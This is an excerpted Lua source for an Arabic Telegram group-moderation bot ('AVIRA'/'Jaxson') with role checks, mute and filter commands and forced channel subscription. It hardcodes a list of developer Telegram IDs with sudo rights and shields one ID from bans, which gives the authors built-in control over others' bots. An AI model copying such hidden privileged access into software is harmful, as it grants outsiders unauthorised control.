...
print('\27[0;35m⩹━━━━⊶❲𝑱𝑨𝑿𝑺𝑶𝑵❳⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua AVIRA.lua')
end
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./AVIRA.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("AV", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S AVIRA -X kill
screen -S AVIRA ./AVIRA
done
]])  
file:close() 
...
print([[
  ...
  DDDDDDDDDDDDD      EEEEEEEEEEEEEEEEEEEEEEVVVVVVVV           VVVVVVVVIIIIIIIIIIDDDDDDDDDDDDD        
D::::::::::::DDD   E::::::::::::::::::::EV::::::V           V::::::VI::::::::ID::::::::::::DDD     
D:::::::::::::::DD E::::::::::::::::::::EV::::::V           V::::::VI::::::::ID:::::::::::::::DD   
DDD:::::DDDDD:::::DEE::::::EEEEEEEEE::::EV::::::V           V::::::VII::::::IIDDD:::::DDDDD:::::D  
  D:::::D    D:::::D E:::::E       EEEEEE V:::::V           V:::::V   I::::I    D:::::D    D:::::D 
  D:::::D     D:::::DE:::::E               V:::::V         V:::::V    I::::I    D:::::D     D:::::D
  D:::::D     D:::::DE::::::EEEEEEEEEE      V:::::V       V:::::V     I::::I    D:::::D     D:::::D
  D:::::D     D:::::DE:::::::::::::::E       V:::::V     V:::::V      I::::I    D:::::D     D:::::D
  D:::::D     D:::::DE:::::::::::::::E        V:::::V   V:::::V       I::::I    D:::::D     D:::::D
  D:::::D     D:::::DE::::::EEEEEEEEEE         V:::::V V:::::V        I::::I    D:::::D     D:::::D
  D:::::D     D:::::DE:::::E                    V:::::V:::::V         I::::I    D:::::D     D:::::D
  D:::::D    D:::::D E:::::E       EEEEEE        V:::::::::V          I::::I    D:::::D    D:::::D 
DDD:::::DDDDD:::::DEE::::::EEEEEEEE:::::E         V:::::::V         II::::::IIDDD:::::DDDDD:::::D  
D:::::::::::::::DD E::::::::::::::::::::E          V:::::V          I::::::::ID:::::::::::::::DD   
D::::::::::::DDD   E::::::::::::::::::::E           V:::V           I::::::::ID::::::::::::DDD     
DDDDDDDDDDDDD      EEEEEEEEEEEEEEEEEEEEEE            VVV            IIIIIIIIIIDDDDDDDDDDDDD
...
sudo_users = {SUDO,1741899314,1896382059,944353237,1741899314,1524355424}   
...
if hash or SudoBot(msg) or sudo2(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or sudo2(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or sudo2(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or sudo2(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or sudo2(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or sudo2(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or sudo2(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'جاكسون'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local AVIRA_Msg = ''  
if msgs < 100 then 
AVIRA_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
AVIRA_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
AVIRA_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
AVIRA_Msg = 'متفاعل' 
elseif msgs < 1200 then 
AVIRA_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
AVIRA_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
AVIRA_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
AVIRA_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
AVIRA_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
AVIRA_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
AVIRA_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
AVIRA_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
AVIRA_Msg = 'رب التفاعل'  
end 
return AVIRA_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝑱𝑨𝑿𝑺𝑶𝑵")  
...
if plugin.Avira and msg then
pre_msg = plugin.Avira(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceAVIRA(msg,data) -- بداية العمل
if msg then
...
Namebot = (database:get(bot_id..'Name:Bot') or 'جاكسون')
...
{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/J_ax_s_o_N"}},
} 
local Keyboard = {
{'𓆩| ıl`ＪᗩＸＳＯＮ´lı |𓆪'},
...
{'𓆩| ıl`ＪᗩＸＳＯＮ´lı |𓆪'},
{'ايدي','العاب جاكسون','سورس','تغير الايدي'},
{'𓆩| ıl`ＪᗩＸＳＯＮ´lı |𓆪'},
...
if sudo2(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,AVIRA_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ' and sudo2(msg) then  
...
if text == 'تعطيل التواصل ' and sudo2(msg) then  
...
if text == 'تفعيل البوت الخدمي ' and sudo2(msg) then  
...
if text == 'تعطيل البوت الخدمي ' and sudo2(msg) then  
...
if text == 'ضع كليشه ستارت' and sudo2(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ◉ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت' and sudo2(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ◉ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر' and sudo2(msg) then 
...
send(msg.chat_id_, msg.id_,' ◉ اصدار سورس جاكسون { s: 6.7}')
end
if text == 'جاكسون مبرمج السورس' and sudo2(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DEV JAXSON](t.me/JAXSO0N)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ✤ ⁽𝑱𝑨𝑿𝑺𝑶𝑵₎ ✤ ', url="t.me/JAXSO0N"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'جاكسون' and sudo2(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
𝐂𝐎𝐃𝐄𝐑 𝐒𝐎𝐔𝐑𝐂𝐄 𝑱𝑨𝑿𝑺𝑶𝑵 🪐
]] 
...
if text == 'مبرمج السورس²' and sudo2(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ✤ ⁽ＤＯＮＧＯＬ₎ ✤ ',url="t.me/UU_DO_N"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'قناه السورس' and sudo2(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/J_ax_s_o_N)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/J_ax_s_o_N"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'بوت تواصل' and sudo2(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❨ TＷＡＳＯＬ ◉  ❩ ', url="t.me/M0o_oO_DY_2bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ضع اسم للبوت" and sudo2(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ◉ ارسل اليه الاسم الان ")
return false
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."sudo:2")
...
if text == 'المشتركين ' and sudo2(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ◉ المشتركين←{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الجروبات ' and sudo2(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ◉ الجروبات←{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين") and sudo2(msg) then
...
if text == ("قائمه العام") and sudo2(msg) then
...
if text == ("قائمه الكتم العام") and sudo2(msg) then
...
if text == 'جلب المشتركين' and sudo2(msg) then 
...
if text == 'رفع المشتركين' and sudo2(msg) then 
...
if text == 'جلب نسخه الاحتياطيه' and sudo2(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين " and sudo2(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
else
...
if text == "تنظيف الجروبات " and sudo2(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text and text:match("^رفع مطور @(.*)$") and sudo2(msg) then
...
if text and text:match("^رفع مطور (%d+)$") and sudo2(msg) then
...
if text and text:match("^تنزيل مطور @(.*)$") and sudo2(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and sudo2(msg) then
...
local AVIRA1_Msg = database:get(bot_id.."AVIRA1:Add:Filter:Rp2"..text..msg.chat_id_)   
if AVIRA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'J_ax_s_o_N')..') \n ◉ '..AVIRA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if AVIRA_Msg and not Special(msg) then  
local AVIRA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if AVIRA_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ◉ ["..AVIRA_Msg.."] \n")
else
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/J_ax_s_o_N)}\n ◉ ["..AVIRA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not sudo2(msg) then
...
if text and text:match("^تغير الاشتراك$") and sudo2(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ◉ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and sudo2(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ◉ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك " and sudo2(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ◉ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ◉$") and sudo2(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ◉ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري" and sudo2(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري" and sudo2(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ◉ تم تعطيل الاشتراك الاجباري")
return false  
end
if text == "الاشتراك الاجباري " and sudo2(msg) then  
...
database:sadd(bot_id.."AVIRA:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."AVIRA:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."AVIRA:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."AVIRA:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."AVIRA:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."AVIRA:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."AVIRA:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."AVIRA:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."AVIRA:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."AVIRA:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."AVIRA:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."AVIRA:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."AVIRA:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "◉ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "J_ax_s_o_N")..")\n◉ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."AVIRA:teh"..msg.chat_id_).."} بجانب اسمك\n◉ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
if data.id_ then 
if data.id_ ~= bot_id then
local AVIRAChengUserName = database:get(bot_id.."AVIRA:Cheng:UserName"..data.id_)
if not data.username_ then 
if AVIRAChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..AVIRAChengUserName..']')
database:del(bot_id.."AVIRA:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if AVIRAChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."AVIRA:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local AVIRAChengPhoto = database:get(bot_id.."AVIRA:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if AVIRAChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صوره الحلو 😂👌🏻")
database:del(bot_id.."AVIRA:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if AVIRAChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."AVIRA:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/JAXSO0N"},{text = ' ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/UU_DO_N"}},
{{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ', url="t.me/hr_ba_1"}},
{{text = '   ◍ M𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂 𖣌  ', url="t.me/J_ax_s_o_N"}},
}
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/J_ax_s_o_N/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{{text = '❃⁽ＨＡＲＶＥＹ₎❃', url="http://t.me/hr_ba_1"}},
{{text = '  ❃ ⁽𝑱𝑨𝑿𝑺𝑶𝑵₎ ❃ ',url="t.me/JAXSO0N"}},
{{text = '  ❃ ⁽ＤＯＮＧＯＬ₎ ❃ ',url="t.me/UU_DO_N"}}
}
local msg_id = msg.id_/2097152/0.5  
...
local Text = [[
 ◉ اهلا بك في سورس جاكسون الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ◉ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❃ ⁽𝑱𝑨𝑿𝑺𝑶𝑵₎ ❃ ',url="t.me/JAXSO0N"}},
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس جاكسون ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس جاكسون ؟ ", 
"كم مره حبيت؟ ", 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❃ ⁽SＯＵＲＣＥ₎ ❃', url="t.me/J_ax_s_o_N"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == '⩹━━━━⊶❲𝑱𝑨𝑿𝑺𝑶𝑵❳⊷━━━━⩺' then
local Text = [[ 
◉من أحسن السورسات على التليجرام سورس جاكسون◉
...
if text == 'العاب جاكسون' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◉ اهلا في قائمه الالعاب المتطوره سورس جاكسون  ◉ 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'J_ax_s_o_N')..') \n ◉ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'J_ax_s_o_N')..') \n ◉ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n◉تم قفل البوتات بالطرد\n◉تم وضع الايدي بدون صوره\n◉تم قفل التكرار بالطرد\n◉تم قفل الروابط\n◉تم قفل التوجيه\n◉تم قفل الملصقات\n◉تم قفل المتحركه\n◉تم قفل الفيديو\n◉تم قفل السب\n◉تم قفل التعديل\n◉تم قفل الفارسيه\n◉تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه »>['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'J_ax_s_o_N')..')')   
end,nil) 
end
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and sudo2(msg) then    
dofile('AVIRA.lua')  
send(msg.chat_id_, msg.id_, ' ◉ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and sudo2(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه العام')
return false
end
if text == ("مسح الحظر العام") and sudo2(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه العام')
return false
end
...
send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج باور عام \n")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم مبرمج باور عام")
return false 
end
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and sudo2(msg) then
...
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس جاكسون \n") 
end
return false
end
...
if text == ("رفع مطور") and msg.reply_to_message_id_ and sudo2(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and sudo2(msg) then
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text == ("مسح قائمه جاكسون") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه جاكسون')
return false
end

if text == 'قائمه جاكسون' and Sudo(msg) then
...
if text == ("رفع جاكسون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text and text:match("^رفع جاكسون @(.*)$") and Sudo(msg) then
local username = text:match("^رفع جاكسون @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text and text:match("^رفع جاكسون (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع جاكسون (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text == ("تنزيل جاكسون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text and text:match("^تنزيل جاكسون @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل جاكسون @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
if text and text:match("^تنزيل جاكسون (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل جاكسون (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local J_ax_s_o_N = database:get(bot_id..'text:ch:user')
if J_ax_s_o_N then
send(msg.chat_id_, msg.id_,'['..J_ax_s_o_N..']')
...
local UserName = (b.username_ or "SRC-AVIRA")
...
function Function_AVIRA(extra, result, success)
database:sadd(bot_id.."sudo:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","◉ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_AVIRA, nil)
return false 
end
...
function Function_AVIRA(extra, result, success)
database:srem(bot_id.."sudo:2", result.sender_user_id_)
...
function Function_AVIRA(extra, result, success)
if result.id_ then
database:srem(bot_id.."sudo:2", result.id_)
...
database:srem(bot_id.."sudo:2", userid)
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'J_ax_s_o_N')..')'
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'J_ax_s_o_N')..')'
...
database:set(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ◉ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."AVIRA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."AVIRA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ◉ تم منع الكلمه مع التحذير")  
database:del(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."AVIRA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."AVIRA1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."AVIRA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ◉ ارسل الكلمه الان")  
database:set(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."AVIRA1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."AVIRA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."AVIRA1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."AVIRA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."AVIRA1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."AVIRA1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ◉ قائمة المنع \n⩹━━━━⊶❲𝑱𝑨𝑿𝑺𝑶𝑵❳⊷━━━━⩺\n"
for k,v in pairs(list) do  
local AVIRA_Msg = database:get(bot_id.."AVIRA1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ← {"..AVIRA_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and sudo2(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ◉ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and sudo2(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'J_ax_s_o_N')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'sudo:2',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح الردود العامه") and sudo2(msg) then 
...
